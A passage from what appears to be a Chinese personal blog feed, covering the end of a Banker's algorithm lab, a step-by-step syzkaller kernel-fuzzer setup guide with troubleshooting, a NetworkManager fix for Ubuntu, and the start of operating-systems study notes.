class="hljs-string">&quot;]---&gt;&quot;</span>;<span class="hljs-comment">//输出安全的进程序列</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[process_num - <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-string">&quot;]&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;安全性检测失败!系统不安全!!!正在恢复资源分配------&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<span class="hljs-comment">//恢复进程资源分配</span><br>        &#123;<br>            Available[j] = Available[j] + Request[i][j];<br>            Allocation[i][j] = Allocation[i][j] - Request[i][j];<br>            Need[i][j] = Need[i][j] + Request[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">init</span>();<br>    cout &lt;&lt; <span class="hljs-string">&quot;初始化进程信息为：&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">print_information</span>();<br>    <span class="hljs-keyword">int</span> i, tt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (tt != <span class="hljs-number">999</span>)<br>    &#123;<br>        cout &lt;&lt; endl<br>             &lt;&lt; <span class="hljs-string">&quot;请输入请求资源Request[进程标号i][资源类型j]:&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;进程i=：&quot;</span>;<br>        cin &gt;&gt; i;<br>        cout &lt;&lt; <span class="hljs-string">&quot;各类资源数量(A B C)=:  &quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m &lt; recourse_num; m++)<br>            cin &gt;&gt; Request[i][m];<br>        cout &lt;&lt; endl;<br>        <span class="hljs-comment">//执行银行家算法</span><br>        <span class="hljs-built_in">Banker_Algorithm</span>(i);<br>        <span class="hljs-comment">//输出每次判断产生的执行序列</span><br>        cout &lt;&lt; endl<br>             &lt;&lt; <span class="hljs-string">&quot;当前资源分配表：&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-built_in">print_information</span>();<br>        cout &lt;&lt; endl<br>             &lt;&lt; <span class="hljs-string">&quot;请输入N(当N=999退出)：&quot;</span> &lt;&lt; endl;<br>        cin &gt;&gt; tt;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="程序初值和运行结果"><a href="#程序初值和运行结果" class="headerlink" title="程序初值和运行结果"></a>程序初值和运行结果</h4><p>初值</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">3</span><br><br><span class="hljs-symbol">0 </span><span class="hljs-number">1</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">0</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">1</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> <span class="hljs-number">2</span><br><br><span class="hljs-symbol">7 </span><span class="hljs-number">5</span> <span class="hljs-number">3</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">2</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">9 </span><span class="hljs-number">0</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">2</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">3</span> <span class="hljs-number">3</span><br><br><span class="hljs-symbol">3 </span><span class="hljs-number">3</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>首先打印进程初始化信息：</p><p><img src="/2021/11/30/%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211128171249029.png" alt="image-20211128171249029"></p><p>为进程1分配资源（1 0 1）</p><p><img src="/2021/11/30/%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211128171330517.png" alt="image-20211128171330517"></p><p>因为不安全无法分配的情况：</p><p><img src="/2021/11/30/%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211128173225317.png" alt="image-20211128173225317"></p><p>无足够资源需要等待的情况：</p><p><img src="/2021/11/30/%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211128171404061.png" alt="image-20211128171404061"></p><p>申请资源超过其最大请求：</p><p><img src="/2021/11/30/%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211128171419204.png" alt="image-20211128171419204"></p><h3 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h3><p>这次实验模拟了银行家算法，让我更加深刻的理解了进程死锁这一概念，也学习了如何进行死锁预防和死锁避免，而银行家算法正是通过死锁避免来实现的，通过自己编写代码，大大加深了对于银行家算法细节的理解，理解了如何通过安全性算法来检查系统状态是否安全，也更加理解了如何通过资源请求算法来请求资源分配和释放未成功分配的资源。</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>syzkaller配置小结</title>
    <link href="/2021/11/27/syzkaller/"/>
    <url>/2021/11/27/syzkaller/</url>
    
    <content type="html"><![CDATA[<p>这部分配置基本参照<a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md">syzkaller官方文档</a></p><h3 id="安装前准备"><a href="#安装前准备" class="headerlink" title="安装前准备"></a>安装前准备</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs terminal">sudo apt update<br>sudo apt install make gcc flex bison libncurses-dev libelf-dev libssl-dev<br></code></pre></td></tr></table></figure><blockquote><p><strong>安装libncurses-dev等时遇到如下问题:</strong></p><p>libncurses5-dev : 依赖: libtinfo5 (= 5.9+20140118-1ubuntu1) 但是 6.1-1ubuntu…</p><p>解决：</p><p>逐个安装相应版本的依赖，缺什么装什么</p><p><img src="/2021/11/27/syzkaller/image-20211125211645437.png" alt="image-20211125211645437"></p><p><img src="/2021/11/27/syzkaller/image-20211125211316133.png" alt="image-20211125211316133"></p></blockquote><p>最后成功全部装完</p><h3 id="下载内核"><a href="#下载内核" class="headerlink" title="下载内核"></a>下载内核</h3><ul><li><p>clone内核源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">git clone --branch v5<span class="hljs-number">.14</span> git:<span class="hljs-comment">//git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git $KERNEL</span><br></code></pre></td></tr></table></figure><p>但是因为这样太慢了，所以我最后采取了在网站上直接下载linux内核5.14版本的压缩包，然后解压至目标路径</p><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-5.14.tar.gz">v5.14压缩包</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs terminal">tar -zxvf linux-5.14.tar.gz -C ~/syz <br></code></pre></td></tr></table></figure></li><li><p>生成默认配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs terminal">cd $KERNEL<br>make defconfig<br>make kvm_guest.config<br></code></pre></td></tr></table></figure></li><li><p>启动所需的配置选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs terminal">sudo vim .config<br></code></pre></td></tr></table></figure><p>手动编辑.config文件，加入下面的变量</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># Coverage collection.</span><br><span class="hljs-attr">CONFIG_KCOV</span>=y<br><br><span class="hljs-comment"># Debug info for symbolization.</span><br><span class="hljs-attr">CONFIG_DEBUG_INFO</span>=y<br><br><span class="hljs-comment"># Memory bug detector</span><br><span class="hljs-attr">CONFIG_KASAN</span>=y<br><span class="hljs-attr">CONFIG_KASAN_INLINE</span>=y<br><br><span class="hljs-comment"># Required for Debian Stretch</span><br><span class="hljs-attr">CONFIG_CONFIGFS_FS</span>=y<br><span class="hljs-attr">CONFIG_SECURITYFS</span>=y<br></code></pre></td></tr></table></figure><p>重新生成配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs terminal">make olddefconfig<br></code></pre></td></tr></table></figure></li><li><p>构建内核</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs terminal">make -j`nproc`<br></code></pre></td></tr></table></figure><p>之后我们可以内核文件夹下看到vmlinux(内核二进制文件)和bzImage(内核镜像)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs terminal">ls $KERNEL/vmlinux<br># sample output - $KERNEL/vmlinux<br>ls $KERNEL/arch/x86/boot/bzImage<br># sample output - $KERNEL/arch/x86/boot/bzImage<br></code></pre></td></tr></table></figure></li></ul><h3 id="构建image"><a href="#构建image" class="headerlink" title="构建image"></a>构建image</h3><ul><li><p>安装debotstrap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs terminal">sudo apt install debootstrap<br></code></pre></td></tr></table></figure></li><li><p>生成Debian Stretch Linux镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs terminal">mkdir $IMAGE<br>cd $IMAGE/<br>wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh<br>chmod +x create-image.sh<br>./create-image.sh<br></code></pre></td></tr></table></figure></li><li><p>安装镜像的额外工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs terminal">./create-image.sh --feature full<br></code></pre></td></tr></table></figure></li></ul><h3 id="构建qemu"><a href="#构建qemu" class="headerlink" title="构建qemu"></a>构建qemu</h3><ul><li><p>首先安装qemu</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs terminal">sudo apt install qemu-system-x86<br></code></pre></td></tr></table></figure></li><li><p>启动qemu虚拟机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs terminal">qemu-system-x86_64 \                            <br>        -m 2G \<br>        -smp 2 \<br>        -kernel /home/zino/syz/linux-5.14/arch/x86/boot/bzImage \<br>        -append &quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot; \ <br>        -drive file=/home/zino/syz/image/stretch.img,format=raw \<br>        -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \<br>        -net nic,model=e1000 \<br>        -enable-kvm \<br>        -nographic \<br>        -pidfile vm.pid \<br>        2&gt;&amp;1 | tee vm.log<br><br></code></pre></td></tr></table></figure><p>输入root后成功进入</p><p><img src="/2021/11/27/syzkaller/image-20211127143311829.png" alt="image-20211127143311829"></p></li><li><p>测试ssh</p><p>因为后面syzkaller会用到ssh连接，所以需要测试一下</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs terminal">ssh -i /home/zino/syz/image/stretch.id_rsa -p 10021 -o &quot;StrictHostKeyChecking no&quot; root@localhost<br></code></pre></td></tr></table></figure><p>成功在另一个终端创建连接</p><p><img src="/2021/11/27/syzkaller/image-20211127143344050.png" alt="image-20211127143344050"></p><p>之后用poweroff关闭虚拟机</p><p>开始安装syzkaller</p><h3 id="安装syzkaller"><a href="#安装syzkaller" class="headerlink" title="安装syzkaller"></a>安装syzkaller</h3><ul><li><p>go环境配置</p><p><code>syzkaller</code>是用go语言写的，所以需要首先配置go环境，安装go的安装包来配置</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs terminal">wget https://dl.google.com/go/go1.14.2.linux-amd64.tar.gz<br>tar -xf go1.14.2.linux-amd64.tar.gz<br>mv go goroot<br>mkdir gopath<br>export GOPATH=`pwd`/gopath<br>export GOROOT=`pwd`/goroot<br>export PATH=$GOPATH/bin:$PATH<br>export PATH=$GOROOT/bin:$PATH<br></code></pre></td></tr></table></figure></li><li><p>下载<code>syzkaller</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs terminal">go get -u -d github.com/google/syzkaller/prog #有点慢，直接git clone<br>#下面的路径可以自己建立，也可以不建，这样就自己指定路径，记得后面用这个路径就行<br>git clone https://github.com/google/syzkaller.git<br>cd gopath/src/github.com/google/syzkaller/<br>make<br></code></pre></td></tr></table></figure><blockquote><p><strong>make后出现错误</strong></p><p><img src="/2021/11/27/syzkaller/QQ%E5%9B%BE%E7%89%8720211127225142.jpg" alt="make错误"></p><p>搜索了之后发现这是由于make是内存不够导致的，所以学习了一下如何创建交换分区来缓解内存压力</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs terminal">&gt;#创建用于交换分区的文件<br>&gt;dd if=/dev/zero of=/swapfile bs=1M count=2048<br>&gt;#设置交换分区文件<br>&gt;mkswap /swapfile<br>&gt;#立即启用交换分区文件<br>&gt;swapon /swapfile<br>&gt;#打开/etc/fstab<br>&gt;sudo vim /etc/fstab<br>&gt;#在下面添加下面一行，使其永久有效<br>&gt;/swapfile swap swap defaults 0 0<br></code></pre></td></tr></table></figure><p>之后再次make就成功了</p><p>参考链接：<a href="https://blog.csdn.net/zhangxiaoyang0/article/details/82501209">Linux上创建SWAP文件/分区</a></p></blockquote><p>可以看到/syzkaller/bin下出现下列文件</p><p><img src="/2021/11/27/syzkaller/image-20211127230030934.png" alt="image-20211127230030934"></p></li><li><p>运行syzkaller manager</p><p>首先需要自己建立一个配置文件my.cfg，作为syzkaller的配置文件</p><p>我的配置路径如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><span class="hljs-attr">&quot;target&quot;</span>: <span class="hljs-string">&quot;linux/amd64&quot;</span>,<br><span class="hljs-attr">&quot;http&quot;</span>: <span class="hljs-string">&quot;127.0.0.1:56741&quot;</span>,<br><span class="hljs-attr">&quot;workdir&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/gopath/src/github.com/google/syzkaller/workdir&quot;</span>,<br><span class="hljs-attr">&quot;kernel_obj&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/linux-5.14&quot;</span>,<br><span class="hljs-attr">&quot;image&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/image/stretch.img&quot;</span>,<br><span class="hljs-attr">&quot;sshkey&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/image/stretch.id_rsa&quot;</span>,<br><span class="hljs-attr">&quot;syzkaller&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/gopath/src/github.com/google/syzkaller&quot;</span>,<br><span class="hljs-attr">&quot;procs&quot;</span>: <span class="hljs-number">8</span>,<br><span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;qemu&quot;</span>,<br><span class="hljs-attr">&quot;vm&quot;</span>: &#123;<br><span class="hljs-attr">&quot;count&quot;</span>: <span class="hljs-number">4</span>,<br><span class="hljs-attr">&quot;kernel&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/linux-5.14/arch/x86/boot/bzImage&quot;</span>,<br><span class="hljs-attr">&quot;cpu&quot;</span>: <span class="hljs-number">2</span>,<br><span class="hljs-attr">&quot;mem&quot;</span>: <span class="hljs-number">2048</span>,<br>#<span class="hljs-attr">&quot;qemu_args&quot;</span>: <span class="hljs-string">&quot;-enable-kvm&quot;</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后还需要创建一个syzkaller的工作区，用来存放crash信息等</p><p>然后就可以直接开始运行syzkaller了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs terminal">mkdir workdir<br>./bin/syz-manager -config=my.cfg<br></code></pre></td></tr></table></figure><blockquote><p>but果然最后一步还是没有那么顺利</p><p>报错如下</p><p><img src="/2021/11/27/syzkaller/QQ%E5%9B%BE%E7%89%8720211127230728.jpg" alt="QQ图片20211127230728"></p><p>努力了很久，找到了一个解决方法（原因有待思考）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs terminal">sudo vim /etc/default/grub<br>#将最后一行修改成<br>GRUB_CMDLINE_LINUX=&quot;console=ttyS0 console=ttyS0,115200n81 no_timer_check  crashkernel=auto rhgb quiet kvm.ignore_msrs=1&quot;<br>#更新配置<br>grub-mkconfig -o &quot;$(readlink -e /etc/grub2.conf)&quot;<br>#使配置生效<br>echo 1 | sudo tee /sys/module/kvm/parameters/ignore_msrs<br></code></pre></td></tr></table></figure><p>这时候再去执行<code>./bin/syz-manager -config=my.cfg</code>就可以成功了</p><p>博客上说是重启生效，但是不重启有效，重启后就又不行了，所以感觉还是有点问题</p><p>参考链接：<a href="https://cloudnull.io/2020/07/fixing-msrs-errors-in-nested-virt/">Fixing MSR 0xe1 to 0x0</a></p><p>后来在官方的troubleshooting里找到了解决方法</p><p><img src="/2021/11/27/syzkaller/QQ%E5%9B%BE%E7%89%8720211127214133-16380205507012.png" alt="问题解决方法"></p><p>在官方给的配置文件的最后一行加上</p><p><code>&quot;qemu_args&quot;: &quot;-enable-kvm&quot;</code></p><p>即把上方的配置文件的最后一行注释取消</p></blockquote></li></ul><p>再次执行<code>./bin/syz-manager -config=my.cfg</code></p><p>成功！</p><p><img src="/2021/11/27/syzkaller/image-20211127185108620.png" alt="image-20211127185108620"></p><p>web端也成功显示</p><p><img src="/2021/11/27/syzkaller/image-20211127185004493.png" alt="image-20211127185004493"></p>]]></content>
    
    
    <categories>
      
      <category>fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
      <tag>syzkaller</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机网络托管消失的问题</title>
    <link href="/2021/11/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%AA%E6%89%98%E7%AE%A1%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2021/11/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%AA%E6%89%98%E7%AE%A1%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>如图所示，Ubuntu20.04频繁出现网络未托管的现象，右上角网络连接图标消失</p><p><img src="/2021/11/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%AA%E6%89%98%E7%AE%A1%E7%9A%84%E9%97%AE%E9%A2%98/image-20211127204523849.png" alt="image-20211127204523849"></p><p>虚拟机的网络除了可以修改/etc/network/interfaces来进行配置以外；还可以直接在network-manager中配置。</p><ul><li><p>通过 interfaces修改的方法参照Server版本。</p></li><li><p>network-manager的配置很直观，按照提示一步一步操作即可，有兴趣的朋友，可以自行Google或者Baidu。</p></li></ul><p>但如果修改了interfaces，又配置了network-manager（以下简称nm），就可能会出现了一些莫名其妙的问题:</p><ol><li><p>interfaces和 nm中的网络设置不一样，系统实际的IP是哪个？</p></li><li><p>有时候莫名其妙的，界面右上角的网络连接图标就丢失了。</p></li><li><p>明明在nm中配置了正确的网络设置，为什么就上不了网呢？</p></li></ol><p>首先，当系统内没有第三方网络管理工具（比如nm）时，系统默认使用interfaces文件内的参数进行网络配置。（就像Server版本一样）</p><p>接着，当系统内安装了 nm之后，nm默认接管了系统的网络配置，使用nm 自己的网络配置参数来进行配置。</p><p>但是，如果用户在安装nm之后，自己手动修改了interfaces 文件，那nm就自动停止对系统网络的管理，系统改使用interfaces 文件内的参数进行网络配置。</p><p>此时，再去修改nm 内的参数，不影响系统实际的网络配置。若要让nm 内的配置生效，必须重新启用nm 接管系统的网络配置。</p><p>现在知道了两者之间的工作关系，再看上面的三个问题：</p><ol><li><p>要看nm是否接管，如果没有接管，系统实际的IP设置以interfaces 中的为准。反之，以nm 中的为准。</p></li><li><p>当nm 停止接管的时候，网络连接图标就丢失了。</p></li><li><p>同样是接管的问题。</p></li></ol><p>如果用户希望直接使用interfaces 进行网络配置，那最好删除network-manager 。</p><p>如果在出现上述问题之后，希望能继续使用nm 来进行网络配置，则需要进行如下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs terminal"># 停止 nm服务<br>sudo service network-manager stop <br># 打开nm 的配置文件(具体配置文件名字进入目录看，可能不太一样)<br>sudo vim /etc/NetworkManager/NetworkManager.conf <br></code></pre></td></tr></table></figure><p><strong>里面有一行：managed=true</strong></p><p><strong>如果你手工改过/etc/network/interfaces，nm会自己把这行改成：managed=false</strong></p><p><strong>将false 修改成true</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs terminal">#重启nm服务<br>sudo service network-manager start<br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs terminal"># 开启NM托管<br>nmcli n on<br></code></pre></td></tr></table></figure><p>有时候开关机后网络连接图标仍会消失，查看配置文件已经设置为了true,这时候再执行一遍下面三条命令后可以成功恢复网络。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">sudo service network-manager <span class="hljs-built_in">stop</span><br>sudo service network-manager <span class="hljs-built_in">start</span><br>nmcli n <span class="hljs-keyword">on</span><br></code></pre></td></tr></table></figure><p><strong>参考链接</strong></p><p><a href="https://blog.csdn.net/vic_qxz/article/details/118863177?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-2&spm=1001.2101.3001.4242.1"> NetworkManager设置_networkmanager配置文件</a></p><p><a href="https://www.cnblogs.com/sankye/p/5020721.html?ivk_sa=1024320u">Ubuntu中启用关闭Network-manager网络设置问题</a></p>]]></content>
    
    
    <categories>
      
      <category>bug</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux网络问题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统笔记</title>
    <link href="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/"/>
    <url>/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="操作系统概念"><a href="#操作系统概念" class="headerlink" title="操作系统概念"></a>操作系统概念</h1><h2 id="第1章-导论"><a href="#第1章-导论" class="headerlink" title="第1章 导论"></a>第1章 导论</h2><h3 id="1-1-操作系统做什么"><a href="#1-1-操作系统做什么" class="headerlink" title="1.1 操作系统做什么"></a>1.1 操作系统做什么</h3><p>计算机系统可以大致分为4个组成部分：计算机硬件、操作系统、系统程序与应用程序和用户。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114101353468.png" alt="image-20211114101353468"></p><p><strong>定义操作系统</strong>：</p><p>操作系统是一直运行在计算机上的程序（通常称为内核），其他程序则为系统程序和应用程序。</p><h3 id="1-2-计算机系统组织"><a href="#1-2-计算机系统组织" class="headerlink" title="1.2 计算机系统组织"></a>1.2 计算机系统组织</h3><p><strong>1.2.1 计算机系统操作</strong></p><p><strong>1.2.2 存储结构</strong></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114104118324.png" alt="image-20211114104118324"></p><p><strong>1.2.3 I/O结构</strong></p><h3 id="1-3-计算机系统体系结构"><a href="#1-3-计算机系统体系结构" class="headerlink" title="1.3 计算机系统体系结构"></a>1.3 计算机系统体系结构</h3><p><strong>1.3.1 单处理器系统</strong></p><p><strong>1.3.2 多处理器系统</strong></p><p><strong>1.3.3 集群系统</strong></p><p>与多处理器系统一样， 集群系统将多个CPU集中起来完成计算任务。然而，集群系统与多处理器系统不同，它是由两个或多个独立的系统藕合起来的。</p><h3 id="1-4-操作系统结构"><a href="#1-4-操作系统结构" class="headerlink" title="1.4 操作系统结构"></a>1.4 操作系统结构</h3><h3 id="1-5-操作系统操作"><a href="#1-5-操作系统操作" class="headerlink" title="1.5 操作系统操作"></a>1.5 操作系统操作</h3><p>1.5.1 双重模式操作<br>1.5.2 定时器</p><h3 id="1-6-进程管理"><a href="#1-6-进程管理" class="headerlink" title="1.6 进程管理"></a>1.6 进程管理</h3><h3 id="1-7-内存管理"><a href="#1-7-内存管理" class="headerlink" title="1.7 内存管理"></a>1.7 内存管理</h3><h3 id="1-8-存储管理"><a href="#1-8-存储管理" class="headerlink" title="1.8 存储管理"></a>1.8 存储管理</h3><p>1.8.1 文件系统管理<br>1.8.2 大容量存储器管理<br>1.8.3 高速缓存<br>1.8.4 V/O系统</p><h3 id="1-9-保护和安全"><a href="#1-9-保护和安全" class="headerlink" title="1.9 保护和安全"></a>1.9 保护和安全</h3><h3 id="1-10-分布式系统"><a href="#1-10-分布式系统" class="headerlink" title="1.10 分布式系统"></a>1.10 分布式系统</h3><h3 id="1-11-专用系统"><a href="#1-11-专用系统" class="headerlink" title="1.11 专用系统"></a>1.11 专用系统</h3><p>1.111 实时嵌入式系统<br>1.11.2 多媒体系统<br>1.11.3 手持系统</p><h3 id="1-12-计算环境"><a href="#1-12-计算环境" class="headerlink" title="1.12 计算环境"></a>1.12 计算环境</h3><p>1.12.1 传统计算<br>1.12.2 客户机服务器计算<br>1.12.3 对等计算<br>1.12.4 基于Web的计算</p><h2 id="第2章-操作系统结构"><a href="#第2章-操作系统结构" class="headerlink" title="第2章 操作系统结构"></a>第2章 操作系统结构</h2><h3 id="2-1-操作系统服务"><a href="#2-1-操作系统服务" class="headerlink" title="2.1 操作系统服务"></a>2.1 操作系统服务</h3><ul><li><p><strong>用户界面</strong>：</p><ul><li>一种是命令行界面（command-line interface CLI）， 它采用文本命令， 并用一定的方法输入（即一种允许输入并编辑的命令〉。</li><li>另一种是批界面， 